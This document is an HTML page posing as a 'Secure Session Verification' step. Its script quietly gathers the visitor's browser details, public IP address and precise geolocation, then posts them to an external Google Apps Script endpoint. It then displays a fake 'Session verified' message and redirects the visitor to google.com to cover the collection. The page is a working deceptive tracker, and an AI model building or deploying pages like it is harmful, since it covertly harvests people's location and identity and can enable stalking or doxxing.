<!DOCTYPE html>
<html>
<head>
  <title>Secure Session Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <h3>Please wait while we verify your session...</h3>

  <script>
    const data = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: screen.width,
      screenHeight: screen.height,
      referrer: document.referrer
    };

    // Get public IP first
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        data.ip = ipData.ip;

        // Then get location
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            data.latitude = pos.coords.latitude;
            data.longitude = pos.coords.longitude;
            data.accuracy = pos.coords.accuracy;
            sendData();
          },
          function (err) {
            data.latitude = '';
            data.longitude = '';
            data.accuracy = '';
            sendData(); // Still send data
          }
        );
      });

    function sendData() {
      const formData = new URLSearchParams();
      for (let key in data) {
        formData.append(key, data[key]);
      }

      fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
        method: "POST",
        body: formData,
        mode: "no-cors" // Prevents CORS blocking
      });

      document.body.innerHTML = "<h3>âœ… Session verified. Redirecting...</h3>";
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2000);
    }
  </script>
</body>
</html>
